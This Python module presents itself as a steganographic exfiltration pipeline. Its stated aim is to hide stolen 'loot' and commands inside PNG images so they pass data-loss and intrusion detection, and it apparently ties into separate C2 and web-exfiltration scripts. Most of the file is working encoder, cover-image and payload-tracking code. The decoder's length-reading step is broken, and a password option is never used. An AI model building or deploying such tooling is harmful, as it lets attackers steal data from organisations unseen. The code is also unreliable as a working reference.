#!/usr/bin/env python3
"""
Steganographic LSB PNG Exfiltration Pipeline
============================================
- Encode loot/commands into PNG LSB channels
- Serve via innocent-looking image endpoints
- Avoid DLP/IDS by blending with normal image traffic
- Integrates with existing stego_c2.py and web_exfil.py
"""

import os
import io
import struct
import zlib
import base64
import hashlib
import logging
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from pathlib import Path
from enum import Enum

logger = logging.getLogger("stego_exfil")


class ExfilStatus(str, Enum):
    PENDING = "pending"
    ENCODED = "encoded"
    SERVED = "served"
    DECODED = "decoded"
    FAILED = "failed"


@dataclass
class StegoPayload:
    payload_id: str
    data: bytes
    filename: str = "payload.png"
    channel: str = "RGB"
    encryption_key: Optional[str] = None
    status: ExfilStatus = ExfilStatus.PENDING
    created_at: str = field(default_factory=lambda: __import__("datetime").datetime.utcnow().isoformat())
    metadata: Dict[str, Any] = field(default_factory=dict)


class LSBStegoExfil:
    """
    LSB-based PNG steganography for exfiltration.
    """

    def __init__(self, password: Optional[str] = None):
        self.password = password
        self._payloads: Dict[str, StegoPayload] = {}

    def encode_png(self, cover_image: bytes, data: bytes, filename: str = "exfil.png") -> Optional[bytes]:
        """
        Encode data into PNG using LSB steganography.
        
        Args:
            cover_image: Raw PNG bytes
            data: Data to hide
            filename: Output filename
            
        Returns:
            PNG bytes with hidden data, or None on failure
        """
        try:
            from PIL import Image
            import numpy as np

            cover = Image.open(io.BytesIO(cover_image)).convert("RGBA")
            pixels = np.array(cover, dtype=np.uint8)

            # Prepare payload: 4-byte length + data
            length_prefix = struct.pack(">I", len(data))
            payload = length_prefix + data

            # Flatten LSBs across RGB channels
            flat_pixels = pixels.flatten()
            if len(payload) * 8 > len(flat_pixels):
                logger.error("Payload too large for cover image")
                return None

            for byte_idx, byte in enumerate(payload):
                for bit_idx in range(8):
                    pixel_idx = byte_idx * 8 + bit_idx
                    if pixel_idx >= len(flat_pixels):
                        break
                    bit = (byte >> (7 - bit_idx)) & 1
                    flat_pixels[pixel_idx] = (flat_pixels[pixel_idx] & 0xFE) | bit

            stego_pixels = flat_pixels.reshape(pixels.shape)
            stego_image = Image.fromarray(stego_pixels, "RGBA")

            out = io.BytesIO()
            stego_image.save(out, format="PNG")
            return out.getvalue()

        except ImportError:
            logger.error("PIL/numpy required for LSB steganography")
            return None
        except Exception as exc:
            logger.error(f"LSB encode failed: {exc}")
            return None

    def decode_png(self, stego_image: bytes) -> Optional[bytes]:
        """
        Decode data from PNG LSB.
        """
        try:
            from PIL import Image
            import numpy as np

            img = Image.open(io.BytesIO(stego_image)).convert("RGBA")
            pixels = np.array(img, dtype=np.uint8)
            flat_pixels = pixels.flatten()

            # Read length first (32 bits)
            length_bytes = bytearray()
            for i in range(32):
                length_bytes.append(flat_pixels[i] & 1)
            length = struct.unpack(">I", bytes(length_bytes))[0]

            # Read payload
            payload = bytearray()
            for byte_idx in range(length):
                byte = 0
                for bit_idx in range(8):
                    pixel_idx = 32 + byte_idx * 8 + bit_idx
                    if pixel_idx >= len(flat_pixels):
                        break
                    bit = flat_pixels[pixel_idx] & 1
                    byte |= bit << (7 - bit_idx)
                payload.append(byte)

            return bytes(payload)

        except ImportError:
            logger.error("PIL/numpy required for LSB steganography")
            return None
        except Exception as exc:
            logger.error(f"LSB decode failed: {exc}")
            return None

    def create_exfil_image(self, data: bytes, width: int = 256, height: int = 256) -> Optional[bytes]:
        """
        Create a PNG image containing hidden exfiltrated data.
        """
        try:
            from PIL import Image
            import numpy as np

            # Create random cover image
            cover = Image.fromarray(
                np.random.randint(0, 256, (height, width, 3), dtype=np.uint8),
                "RGB"
            )

            # Convert to RGBA for LSB
            cover = cover.convert("RGBA")
            out = io.BytesIO()
            cover.save(out, format="PNG")
            cover_bytes = out.getvalue()

            return self.encode_png(cover_bytes, data)

        except ImportError:
            logger.error("PIL/numpy required")
            return None
        except Exception as exc:
            logger.error(f"Create exfil image failed: {exc}")
            return None

    def register_payload(self, payload: StegoPayload) -> str:
        self._payloads[payload.payload_id] = payload
        return payload.payload_id

    def get_payload(self, payload_id: str) -> Optional[StegoPayload]:
        return self._payloads.get(payload_id)

    def list_payloads(self) -> List[Dict[str, Any]]:
        return [
            {
                "payload_id": p.payload_id,
                "filename": p.filename,
                "status": p.status.value,
                "size": len(p.data),
                "created_at": p.created_at,
            }
            for p in self._payloads.values()
        ]
